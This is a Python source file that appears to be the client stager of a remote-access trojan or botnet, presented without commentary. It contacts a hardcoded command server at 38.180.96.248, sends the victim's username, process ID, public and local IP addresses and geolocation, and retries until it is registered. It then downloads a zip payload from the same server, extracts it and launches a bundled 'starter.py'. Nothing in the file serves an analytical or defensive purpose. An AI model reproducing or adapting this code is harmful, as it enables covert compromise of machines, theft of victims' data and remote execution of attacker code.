import base64
import os, time, shutil
import hashlib
import zipfile
from io import BytesIO
import socket, subprocess, requests
from requests import get
import random
from requests.exceptions import ConnectionError

# ------------Encr------------------
from Crypto.Cipher import AES

class Encryptor:
    def __init__(self, key):
        self.__key__ = key

    def __decrypt(self, enc):
        unpad = lambda s: s[:-ord(s[-1:])]

        enc = base64.b64decode(enc)
        iv = enc[:AES.block_size]
        cipher = AES.new(self.__key__, AES.MODE_CFB, iv)
        return unpad(base64.b64decode(cipher.decrypt(enc[AES.block_size:])).decode('utf-8'))

    def decrypt(self, fn):
        with open(fn, "rb") as f:
            data = f.read()
        with open(fn, "w", encoding="utf-8") as f:
            data = self.__decrypt(data)
            # data = str(data)
            # print(data)
            # data = str(base64.b64decode(data))[2:-1]
            f.write(data)

# ------------------END---------------

def waiting(s=None, creds=()):
    del s
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect(creds)
    except:
        s.close()
        s = waiting(s=s, creds=creds)
        return s
    else:
        return s

def show_geo(public_ip=None):
    try:
        geo = []
        lp = str(socket.gethostbyname(socket.gethostname()))
        geo.append(public_ip + " - public ip\n" + lp + " - local ip")

        ip = public_ip
        response = requests.get(url=f"http://ip-api.com/json/{ip}").json()
        if response["status"] == "fail":
            return "fail"
        for name in response:
            name = str(name)
            if "country" in name:
                geo.append(name + " -->> " + str(response[name]))
            elif "regionName" in name:
                geo.append(name + " -->> " + str(response[name]))
            elif "city" in name:
                geo.append(name + " -->> " + str(response[name]))
            elif "lat" in name:
                geo.append(name + " -->> " + str(response[name]))
            elif "lon" in name:
                geo.append(name + " -->> " + str(response[name]))
            elif "as" in name:
                geo.append("computer" + " -->> " + str(response[name]))
        """area = folium.Map(location=[response.get("lat"), response.get("lon")])
        area.save(f"{response.get('query')} {response.get('city')}.html")"""
        return "\n".join(geo)
    except requests.exceptions.ConnectionError:
        print("Connection died")
        return

def decrypt_folder(name, key):
    fn = os.listdir(name)[0]
    names = os.listdir("test\\" + fn)
    e = Encryptor(key)
    for name in names:
        if os.path.isfile("test\\" + fn + "\\" + name):
            e.decrypt("test\\" + fn + "\\" + name)

    del e
    return fn

def get_files(ip, status="update"):
    key = hashlib.pbkdf2_hmac('sha256', os.urandom(32), os.urandom(32), random.randint(100000, 999999))
    k = str(base64.b64encode(key))[2:-1]

    creds = ("user", "pas")
    url = "http://" + ip + ":65000"
    data = {
        "port": "10101",
        "status": status,
        "key": k,
    }
    q = requests.post(url, auth=creds, data=data)
    z = zipfile.ZipFile(BytesIO(q.content))
    z.extractall("./test")
    # _ = decrypt_folder("test", key)
    _ = os.listdir("test")[0]
    shutil.move(f"test/{_}", "./")
    os.rmdir("test")
    os.putenv("test", k)
    return "" + _


ip, port = ("38.180.96.248", 3333)
shell_addr = ("", 8081)

# os.system('chcp 65001')
subprocess.getoutput('chcp 65001')

key = hashlib.pbkdf2_hmac('sha256', os.urandom(32), os.urandom(32), random.randint(100000, 999999))
alias = base64.b64encode(key).decode()[::-1]

client_ip = get("http://api.ipify.org").text
data = {"port": port,
        "alias": alias,
        "status": "register",
        "user": subprocess.getoutput('whoami'),
        'pid': str(os.getpid()),
        'ip': client_ip,
        "geo": str(base64.b64encode((show_geo(client_ip)).encode("utf-8")))[2:-1],
        }

# headers = {"User-Agent" : "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"}
headers = {'Connection': 'close'}

url = 'http://' + ip + ":65000" '/'
# c_len = len(data.get('user')) + len(data.get('pid')) + len(data.get('pwd')) + 10
creds = ('user', 'pass')

while True:
    if (requests.post(url, data=data, auth=creds, headers=headers)).status_code == 200:
        break
    print("fail")

time.sleep(1)
print('ok')

folder_n = get_files(ip, status="get")

os.chdir(folder_n)

subprocess.Popen("python starter.py " + folder_n)

#
# while True:
#     try:
#         time.sleep(60)
#         client_ip = get("http://api.ipify.org").text
#         data = {"port": port, "alias": alias, "status": "update", "user": subprocess.getoutput('whoami'),
#                 'pid': str(os.getpid()), 'ip': client_ip,
#                 "geo": str(base64.b64encode((show_geo(client_ip)).encode("utf-8")))[2:-1]}
#         headers = {'Connection': 'close'}
#
#         url = 'https://' + ip + '/'
#         creds = ('user', 'pass')
#
#         print("send")
#     except requests.exceptions.ConnectionError:
#         pass

# subprocess.Popen("python client.py")
